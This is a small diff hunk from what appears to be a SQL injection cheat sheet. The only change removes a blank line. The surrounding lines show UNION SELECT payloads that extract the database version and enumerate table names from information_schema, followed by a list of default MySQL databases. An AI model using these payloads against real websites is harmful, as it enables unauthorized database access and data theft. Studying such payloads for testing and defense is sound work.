@@ -146,7 +146,6 @@ UNION SELECT 1,2,@@version - extract version number
 
 UNION SELECT 1,table_name,3 from information_schema.tables where table+schema=database()
 
-
 ##DEFAULT DATABASES
 information_schema
 performance_schema
